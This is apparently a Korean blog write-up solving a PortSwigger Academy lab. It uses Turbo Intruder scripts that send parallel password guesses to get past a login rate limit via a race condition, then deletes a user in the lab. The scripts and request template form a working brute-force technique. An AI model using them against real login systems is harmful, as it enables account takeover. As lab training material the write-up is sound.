---
layout: post
title: "Burp Academy-레이스컨디션 관련 취약점: Bypassing rate limits via race conditions"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, 레이스컨디션, Race Condition]
toc: true
last_modified_at: 2023-09-01 10:33:00 +0900
---

# 개요
- 새로 추가된 레이스 컨디션 관련 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits
- 취약점 설명페이지: https://portswigger.net/web-security/race-conditions#limit-overrun-race-conditions
- 난이도: PRACTITIONER (보통)

# 문제 개요 
- 이번에는 로그인 시도 횟수 제한이 있는 로그인기능을 브루트포스로 푸는 문제이다. 
- 로그인 시도 횟수 카운터가 올라가기 전에 요청을 병렬로 보내면 될 것 같다. 
- 로그인에 시도할 패스워드 목록도 제공해주고 있다. 
- 로그인에 성공하면 admin 패널에서 carlos유저를 삭제하면 된다. 
- 이 랩은 15분 시간제한이 있다. 이 시간안에 브루트포스를 성공시켜야 한다. 

```
This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.

To solve the lab:

Work out how to exploit the race condition to bypass the rate limit.
Successfully brute-force the password for the user carlos.
Log in and access the admin panel.
Delete the user carlos.
You can log in to your account with the following credentials: wiener:peter.

You should use the following list of potential passwords:
```

# 터보 인트루더를 사용하기 
요청을 병렬로 보내기 위한 다음과 같은 기본형이 소개되어 있다. 

```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    # queue 20 requests in gate '1'
    for i in range(20):
        engine.queue(target.req, gate='1')
    
    # send all requests in gate '1' in parallel
    engine.openGate('1')
```

# 풀이
## Turbo Intruder 설치
혹시 Turbo Intruder가 설치되어 있지 않다면 Extensions > BApp Store에서 Turbo Intruder를 설치한다. 

## 로그인 요청을 터보 인트루더로 보내기 
로그인요청을 Burp Proxy로 잡은 후에 마우스 오른쪽 버튼 클릭 Extensions > Turbo Instruder > Send to turbo intruder를 선택한다. 

## 터보 인트루더 세팅하기 
1. 로그인 요청 조정 

로그인 요청을 조금 조정한다. useranme은 carlos로 변경하고 password부분은 %s로 바꾼다. 

```http
POST /login HTTP/2
Host: 0a150014032cbb6382ec568f00bd00c3.web-security-academy.net
Cookie: session=TYVh5XkpMwjuvNVwTx9Vaj0jUDX2MUCR
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a150014032cbb6382ec568f00bd00c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a150014032cbb6382ec568f00bd00c3.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

csrf=zFE02nmU8JvnHNLgT1xbM2gRS4Ori9vT&username=carlos&password=%s
```


2. 문제에서 주어진 패스워드를 파일로 저장해준다. 나는 C:\passwords\passwords.txt에 저장해두었다. 

3. 패스워드 후보를 파일에서 얻어오도록 다음과 같이 코드를 수정한다. 

```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    for word in open('C:\passwords\passwords.txt'):
        engine.queue(target.req, word.rstrip(), gate='1')
    
    # send all requests in gate '1' in parallel
    engine.openGate('1')


def handleResponse(req, interesting):
    if interesting:
        table.add(req)

```

## 브루트 포스 공격시도 

4. attack을 눌러서 공격을 시도한다. 그러면 다음과 같이 결과라 리스트업 된다. 여러 요청중에 하나만 302응답인 것을 알 수 있다. 이 것이 calors유저의 패스워드이다. 

(혹시 csrf토큰에러가 발생한다면 새롭게 로그인 웹 페이지에 들어가서 새로운 csrf토큰을 얻어와서 세팅한다. )

![attack결과](/images/burp-academy-race-condition-2-1.png)

5. calros유저로 로그인한다. 

![calors유저로 로그인](/images/burp-academy-race-condition-2-2.png)

6. Delete버튼을 눌러서 calros 유저를 삭제하면 문제가 풀렸다는 메세지가 출력된다. 

![문제풀이](/images/burp-academy-race-condition-2-success.png)

# 배운 것
- 이전 문제에서 Burp Reapeter에서 수행했던 HTTP/2 Single Packet Attack 을 Turbo Intruder를 이용해서 수행할 수 있다. 
- 코드를 작성할 수 있으니 더 여러방면에서 쓸 수 있다. 

# 참고 
- https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py
- https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack